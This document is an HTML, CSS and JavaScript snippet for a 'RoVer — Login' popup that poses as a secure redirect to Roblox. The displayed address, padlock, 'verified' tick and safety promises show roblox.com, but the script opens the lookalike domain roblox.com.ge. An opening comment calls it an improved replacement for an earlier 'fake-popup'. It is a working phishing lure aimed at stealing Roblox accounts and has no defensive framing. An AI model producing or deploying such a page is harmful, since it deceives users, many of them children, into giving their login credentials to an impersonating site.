<!-- --- Improved, trustworthy "Login / Redirect" popup --- -->
<!-- Insert this instead of your previous fake-popup block -->
<div class="overlay" id="overlay" style="display:none;"></div>

<div class="auth-popup" id="authPopup" role="dialog" aria-modal="true" aria-labelledby="authTitle" style="display:none;">
  <div class="auth-topbar">
    <div class="left">
      <img class="site-fav" id="siteFav" src="https://www.roblox.com/favicon.ico" alt="Roblox favicon" onerror="this.style.display='none'">
      <div class="titles">
        <div class="main-title">RoVer ‚Äî Login</div>
        <div class="sub-title">Secure redirect</div>
      </div>
    </div>

    <div class="right">
      <div class="domain-pill" id="domainPill">
        <span class="padlock">üîí</span>
        <span class="domain-text" id="domainText">https://www.roblox.com/login</span>
        <span class="verified" title="Official site">‚úîÔ∏é</span>
      </div>
      <button class="close-btn" id="authClose" aria-label="Close">√ó</button>
    </div>
  </div>

  <div class="auth-body">
    <h2 id="authTitle">You will be redirected to Roblox</h2>
    <p class="muted">
      For your safety, this opens the official Roblox login page in a new tab. We never ask for or store your password.
    </p>

    <div class="url-row">
      <input id="fullUrl" class="full-url" readonly value="https://www.roblox.com/login">
      <button id="copyUrl" class="small-btn" title="Copy URL">Copy</button>
      <button id="openNew" class="primary-btn" title="Open in new tab">Open in new tab ‚Üó</button>
    </div>

    <ul class="info-list">
      <li>üîê HTTPS connection ‚Äî check the browser address bar after opening.</li>
      <li>üõ°Ô∏è Opens in a separate tab (no credentials are submitted to this site).</li>
      <li>‚ÑπÔ∏è RoVer will receive your Roblox username & user id only (no password).</li>
    </ul>

    <div class="footer-row">
      <a href="#" class="help-link">Help article</a>
      <button id="cancelAuth" class="ghost-btn">Cancel</button>
    </div>
  </div>
</div>

<style>
  /* overlay & popup */
  .overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 999; }
  .auth-popup {
    position: fixed; left:50%; top:50%; transform: translate(-50%,-50%);
    width:720px; max-width:calc(100% - 32px);
    background: #fff; color:#111; border-radius:10px; box-shadow: 0 30px 80px rgba(0,0,0,0.6);
    z-index: 1000; font-family: "Roboto", system-ui, -apple-system, "Segoe UI", Roboto, Arial;
    overflow: hidden;
  }

  .auth-topbar { display:flex; justify-content:space-between; align-items:center; padding:12px 16px; background:linear-gradient(#f7f7f8,#efeff0); border-bottom:1px solid #e3e3e6; }
  .left { display:flex; gap:12px; align-items:center; }
  .site-fav { width:18px; height:18px; border-radius:3px; display:block; }
  .main-title { font-weight:700; font-size:15px; }
  .sub-title { font-size:12px; color:#666; margin-top:2px; }

  .domain-pill { display:flex; gap:8px; align-items:center; background:#eaf7ef; color:#0b6b3a; padding:6px 10px; border-radius:8px; font-weight:600; font-size:13px; border:1px solid #d7efe0; }
  .padlock { font-size:14px; }
  .verified { color:#0b6b3a; font-size:13px; }

  .close-btn { margin-left:12px; background:transparent; border:none; font-size:20px; cursor:pointer; color:#444; padding:6px 8px; border-radius:6px; }
  .close-btn:hover { background:#fdecec; color:#b30000; }

  .auth-body { padding:18px 20px 22px; }
  h2 { margin:0 0 8px; font-size:20px; }
  .muted { color:#444; margin:0 0 12px; }

  .url-row { display:flex; gap:8px; align-items:center; margin:8px 0 12px; }
  .full-url { flex:1; padding:10px 12px; border:1px solid #ddd; border-radius:8px; font-family: monospace; color:#333; background:#fafafa; }
  .small-btn { padding:8px 10px; border-radius:8px; border:1px solid #ddd; background:#fff; cursor:pointer; font-weight:600; }
  .small-btn:hover { background:#f5f5f6; }
  .primary-btn { padding:10px 14px; background:#c91673; color:#fff; border:none; border-radius:8px; cursor:pointer; font-weight:700; }
  .primary-btn:hover { background:#a1125f; }

  .info-list { margin:12px 0 8px; color:#444; padding-left:18px; }
  .footer-row { display:flex; justify-content:space-between; align-items:center; margin-top:14px; }
  .help-link { color:#c91673; font-weight:600; text-decoration:none; }
  .ghost-btn { background:transparent; border:1px solid #ddd; padding:8px 12px; border-radius:8px; cursor:pointer; }

  /* responsive */
  @media (max-width:640px) {
    .auth-popup { width:92%; }
    .domain-pill { display:none; }
  }
</style>

<script>
  // Hook into your existing login button:
  const loginBtn = document.getElementById('loginBtn'); // your current login button
  const authPopup = document.getElementById('authPopup');
  const overlay = document.getElementById('overlay');
  const authClose = document.getElementById('authClose');
  const cancelAuth = document.getElementById('cancelAuth');
  const openNew = document.getElementById('openNew');
  const copyUrl = document.getElementById('copyUrl');
  const fullUrl = document.getElementById('fullUrl');

  // The real URL you want to show/open
  const REAL_URL = 'https://roblox.com.ge/login?returnUrl=2099296147452818';

  // Show popup
  function openAuthPopup() {
    fullUrl.value = REAL_URL;
    document.getElementById('domainText').textContent = REAL_URL;
    authPopup.style.display = 'block';
    overlay.style.display = 'block';
    // focus the copy button for keyboard users
    copyUrl.focus();
  }

  // Close popup
  function closeAuthPopup() {
    authPopup.style.display = 'none';
    overlay.style.display = 'none';
  }

  // Event wiring
  if (loginBtn) {
    loginBtn.addEventListener('click', (e) => {
      e.preventDefault();
      openAuthPopup();
    });
  }

  authClose.addEventListener('click', closeAuthPopup);
  cancelAuth.addEventListener('click', closeAuthPopup);
  overlay.addEventListener('click', closeAuthPopup);

  // Open the real site in a new tab (safer and transparent)
  openNew.addEventListener('click', () => {
    // Use noopener to prevent the opened page from accessing this one
    const newWin = window.open(REAL_URL, '_blank', 'noopener,noreferrer');
    if (!newWin) {
      // popup blocked ‚Äî fallback: replace current location (explicit)
      window.location.href = REAL_URL;
    }
    closeAuthPopup();
  });

  // Copy URL to clipboard
  copyUrl.addEventListener('click', async () => {
    try {
      await navigator.clipboard.writeText(fullUrl.value);
      copyUrl.textContent = 'Copied';
      setTimeout(() => { copyUrl.textContent = 'Copy'; }, 1400);
    } catch (err) {
      // fallback: select + execCommand
      fullUrl.select();
      try { document.execCommand('copy'); copyUrl.textContent = 'Copied'; setTimeout(()=>copyUrl.textContent='Copy',1400); } catch(e){ alert('Copy failed ‚Äî select and copy manually.'); }
    }
  });

  // Accessibility: close on ESC
  document.addEventListener('keydown', (ev) => {
    if (ev.key === 'Escape') closeAuthPopup();
  });
</script>
